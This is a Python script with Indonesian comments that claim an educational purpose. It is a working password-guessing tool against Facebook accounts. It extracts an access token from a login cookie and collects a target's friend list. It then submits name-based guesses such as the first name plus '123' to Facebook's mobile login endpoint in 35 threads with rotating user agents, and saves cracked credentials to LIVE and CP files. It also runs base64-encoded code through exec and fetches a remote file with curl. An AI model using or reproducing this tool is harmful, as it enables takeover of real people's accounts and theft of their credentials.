# METHODE UMUM YANG BANYAK DIGUNAKAN
# PADA INTINYA UDAH GUE CEK SEMUA SC YG MEREKA PAKE 
# SAMA SAJA HANYA DI HEADER YANG BERBEDA 
# MASALAH CODINGAN SAMA CUMA DIRUBAH MODEL CODINGAN SAJA
# PADA INTINYA MEMAKAI METHODE YANG SAMA KAYA CONTOH SC YG GUE BUAT INI
# JADI PAHAMI YANG PEMULA BIYAR TIDAK DIBODOHI
# MANA DEV ASLI DAN MANA YANG PERICODE TERIAK PERICODE
# APALAGI YANG MENGGUNAKAN CARA INI UNTUK NGERIP
# SEMATA-MATA HANYA BERTUJUAN UNTUK PENDIDIKAN
# AGAR TIDAK MUDAH DIBODOHI KARNA MEMANG SUDAH BANYAK RIPER
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBwYW5qaWhpdGFt=='))
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
pwv=[]
id,id2=[],[]
loop,ok,cp=0,0,0
akun,method=[],[]
tokenku,uid= [],[]
jancok=[]
def clear():
	os.system('clear')
def back():
	login()
# DATA WAKU
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU

### TEXT JALAN ###
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#LOADING ANIMASI
def loading():
    animation = ["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{P}[{H}●{P}] LOADING PROSESS...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

### UNTUK AMBIL PROXY GITU AJA KOK REPOT #### 
proxy= requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
open('proxy.txt','w').write(proxy)
proxy=['SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4X Build/OPM1.171019.018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36','NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

# CARA SIMPLE MENGAMBIL USER AGENT  { LINK BOLEH GANTI DENGAN LINK USER AGENT KALIAN } 
if not os.path.isfile('.userset.txt'):
    os.system('curl -L https://raw.githubusercontent.com/k4long666/user_agent/main/userset.txt > .userset.txt')
if not os.path.isfile('/sdcard/UA'):
	n = random. randint(11111,99999);x = open('/sdcard/UA', 'a');x.write(str(n));x.close()
with open(".userset.txt") as funk:
    kuntul = funk.readlines()

# UNTUK BUAT FOLDER DATA YANG DIPERLUKAN CIL
def folderdata():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("LIVE")
    except:pass
    try:os.mkdir("UA")
    except:pass

def banner():
	clear()
	print("""%s   
──▄▀▀▀▀▀▀▀▄────────────────
──█───────█────────────────
──█████████─────────▄▀▀▄───
░░███─▀─███░░█▀█▀▀▀▀█░░█░░░
░░███─▀─███░░▀░▀░░░░░▀▀░░░░
░░████▄████░░ RANSOMWARE ░░                   
"""%(H))

# BAGIAN LOGIN METHOD UMUM NGAB
def login():
	try:
		token = open('.token.txt','r').read()
		jancok= open('.jancok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies = {"cookie":jancok})
			kuntul_kau()
		except KeyError:
			menu_login()
		except requests.exceptions.ConnectionError:
			banner()
			print(' %s# JARINGAN BERMASALAH PERIKSA DAN COBA LAGI ! '%(M))
			exit()
	except IOError:
		menu_login()

### BAGIAN MENU LOGIN NGAB
def menu_login():
	banner()
	try:
		cookie=input("%s [%s●%s] LOGIN COOKIES : %s"%(P,H,P,H))
		loading()
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".jancok.txt", "w").write(cookie)
		print(' LOGIN SUCCESS ✓');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .jancok.txt")
		print(f'%s[%s●%s]%s LOGIN GAGAL !!%s'%(P,H,P,P,M))
		exit()

# CRACK ID PUBLIK , FOLLOWERS, LIKE INTINYA SAMA TINGGAL UBAH DIKIT
def kuntul_kau():
	os.system('clear')
	banner()
	try:
		jancok= open('.jancok.txt','r').read()
	except IOError:
		exit()
	pil = input(' TARGET ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":jancok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(' TOTAL ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('#KONEKSI BERMASALAH PERIKSA JARINGAN ANDA')
		exit()
	except (KeyError,IOError):
		print('# KEMUNGKINAN PERTEMANAN TIDAK PUBLIK')
		exit()
		
# BAGIAN PENGATURAN 
def setting():
	print('')
	jalan(f' 01. Awali dari akun tua ')
	jalan(f' 02. awali dari akun bocah ')
	jalan(f' 03. Awali dari akun bocah tua')
	print('')
	hu = input(' Ketik pilihan : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' Pilihan salah ')
		exit()
	print('\n')
	jalan(' 01. Gaya miring ')
	jalan(' 02. Gaya nungging ')
	print('')
	hc = input(' Pilih methode gaya : ')
	if hc in ['1','01']:
		gayamiring()
	elif hc in ['']:
		print(' Pilihan salah ')
		setting()
	elif hc in ['2','02']:
		gayanungging()
	else:
		gayamiring()

# METHODE PASSWORD MASIH BANYAK CARA DAN METHOD NYA
# TINGGAL LU UBAH SESUAI YANG LU MAU
def gayamiring():
	jalan(f' Hasil LIVE tersimpan Di : LIVE/%s '%(okc))
	jalan(f' Hasil CP tersimpan Di : CP/%s'%(cpc))
	jalan(f' Mainkan mode pesawat jika tidak ada hasil\n')
	with tred(max_workers=35) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','password','amanah','hidayah','semangat','bintang','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mobile' in method:
				pool.submit(crack2,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	panjihitam(nel('\t[bold green] Crack Selesai ✓[green] '))
	print('')
	print(' Lanjut Crack Kembali {y/t } ? ')
	woi = input('Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print('Thanks you ')
		time.sleep(2)
		exit()

def gayanungging():
	jalan(f' Hasil LIVE tersimpan Di : LIVE/%s '%(okc))
	jalan(f' Hasil CP tersimpan Di : CP/%s'%(cpc))
	jalan(f' Mainkan mode pesawat jika tidak ada hasil\n')
	with tred(max_workers=35) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','password','amanah','hidayah','semangat','bintang','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mobile' in method:
				pool.submit(crack2,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	panjihitam(nel('\t[bold green] Crack Selesai ✓[green] '))
	print('')
	print(' Lanjut Crack Kembali {y/t } ? ')
	woi = input('Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print('Thanks you ')
		time.sleep(2)
		exit()


# METHODE CRACK NYA NGAB JIKA INGIN HASIL MAXIMAL
# UBAH LAGI BAGIAN HEADER DAN UA NYA NGAB
def crack(idf,pwv):
	global loop,ok,cp
	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	ua = random.choice(kuntul)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxy)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {K}CHEKPOINT ✓\n USERNAME : {idf}\n PASSWORD : {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {H}LIVE ✓\n USERNAME : {idf}\n PASSWORD : {pw}{N}')     
				open('LIVE/'+okc,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1
	
# FB2
def crack2(idf,pwv):
	global loop,ok,cp
	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	ua = random.choice(kuntul)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxy)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {K}CHEKPOINT ✓\n USERNAME : {idf}\n PASSWORD : {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {H}LIVE ✓\n USERNAME : {idf}\n PASSWORD : {pw}{N}')     
				open('LIVE/'+okc,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1
if __name__=="__main__":
	os.system('git pull')
	os.system('clear');loading()
	login()
